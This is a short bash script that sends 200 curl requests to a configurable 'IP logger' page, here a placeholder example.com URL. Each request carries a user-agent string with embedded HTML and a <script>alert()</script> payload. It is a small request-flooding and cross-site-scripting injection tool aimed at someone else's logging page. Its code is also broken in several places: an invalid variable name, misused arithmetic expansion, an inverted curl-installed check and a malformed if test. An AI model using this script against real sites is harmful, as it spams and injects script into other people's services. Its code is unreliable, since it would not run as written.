#!/bin/bash
count=200; #Spam counter!
url="http://example.com/iplogger.php" #The logger page can be entered here.
user-agent="IP-Logger/3.0.1 (Flood; HackOS; Linux x86_64; rv:52.4) <b>Flood $((i))!</b> <script>alert('Do not log my IP address!!');</script>" #The user agent can be defined here
RED='\033[0;31m'
GREEN='\e[32m'
NC='\033[0m'
if [[ $1 == 'start' ]]; then
	if apt -qq list curl 2>/dev/null | grep -q installed ; then
		echo -e "Command not found! Install? (y/n) \c"
		read
		if "$REPLY" = "y"; then
			sudo apt-get install curl
		else
			printf "${RED}cURL installer aborted!${NC}\n"
	   fi
	else
		printf "${RED}Start flooding...${NC}\n"
		for ((i=0; i < count; i++)) ; do
			curl --silent --output /dev/null -A $((user-agent)) $((url)) > /dev/null
		done
		printf "${GREEN}Flooding has been finished!${NC}\n"
	fi
else
	printf "${RED}Start it with 'start'!${NC}\n"
fi
